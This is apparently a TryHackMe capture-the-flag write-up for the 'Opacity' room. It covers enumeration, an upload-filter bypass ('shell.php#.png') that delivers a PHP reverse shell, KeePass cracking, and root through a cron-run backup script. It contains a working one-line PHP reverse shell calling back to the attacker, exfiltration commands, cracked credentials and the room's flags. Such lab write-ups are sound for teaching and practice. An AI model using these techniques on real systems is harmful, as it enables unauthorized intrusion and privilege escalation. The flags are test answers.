# TryHackMe: Opacity Writeup

**Room Link:** [Opacity](https://tryhackme.com/room/opacity)

---

## Enumeration

We begin by running `nmap` to discover open ports and services:

```bash
nmap -sC 10.10.104.194
```

**Results:**
```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

The server is running HTTP. Visiting the page reveals a Login portal. To find additional directories, we use `gobuster`:

```bash
gobuster dir -u http://10.201.4.147/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

This discovers two paths:
- `/css`
- `/cloud`

## Initial Foothold

The `/cloud` directory allows us to upload an image and view it. We can attempt to upload a PHP reverse shell, but the application restricts uploads to files ending with `.jpg` or `.png`.

We bypass this restriction by appending `#` to the extension: `shell.php#.png`.

**Exploitation Steps:**
1. Copy the standard PHP reverse shell payload and rename it:
   ```bash
   cp /usr/share/webshells/php/php-reverse-shell.php shell.php#.png
   ```
2. Edit `shell.php#.png` to include your attacking IP address and listening port (e.g., `1234`).
3. Start an HTTP server on your attacker machine in the directory containing the shell:
   ```bash
   python3 -m http.server
   ```
4. Start a netcat listener:
   ```bash
   nc -lvnp 1234
   ```
5. On the `/cloud` upload page, provide the URL to your payload: `http://<your_ip>:8000/shell.php#.png`.

The server successfully fetches the image, executes the PHP code, and establishes our reverse shell. We are now logged in as `www-data`.

## Privilege Escalation: www-data -> sysadmin

While exploring the system, we discover a KeePass database in the `/opt/` folder:

```bash
$ cd /opt
$ ls 
dataset.kdbx 
```

We can exfiltrate this database to our attacker machine by starting an HTTP server on the target and downloading it locally:

On the target shell:
```bash
python3 -m http.server
```

On our attacking machine:
```bash
wget http://10.201.4.147:8000/dataset.kdbx
```

To crack the KeePass database, we first convert it to a format Hashcat/John can understand, and then use `john` to crack it:

```bash
keepass2john dataset.kdbx > dataset.hash
john dataset.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

This cracks the password to the `.kdbx` file: `741852963`

Opening the database with `KeePassXC` (`sudo apt install keepassxc-full` if not installed) using the cracked password reveals an entry for `sysadmin`:
- **Username:** `sysadmin`
- **Password:** `Cl0udP4ss40p4city#8700`

We can use these credentials to SSH into the machine as `sysadmin` and grab the user flag:

```bash
sysadmin@ip-10-201-4-147:~$ cat local.txt
6661b61b44d234d230d06bf5b3c075e2
```

## Privilege Escalation: sysadmin -> root

Checking the home directory for `sysadmin`, we find a `scripts` folder containing `script.php`:

```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;
...
```

The script includes `lib/backup.inc.php`, which we discover is executed by `root` periodically via a cron job. Because we have modify permissions on `backup.inc.php`, we can insert our own PHP reverse shell directly into the backup script.

```bash
nano lib/backup.inc.php
```

Add your reverse shell payload:
```php
<?php
$sock=fsockopen("<your_ip_address>",1234);exec("/bin/sh -i <&3 >&3 2>&3");
...
```

Start another netcat listener on your machine (`nc -lvnp 1234`) and wait for the cron job to trigger the backup script.

```bash
# whoami
root
# cat /root/proof.txt
ac0d56f93202dd57dcb2498c739fd20e
```
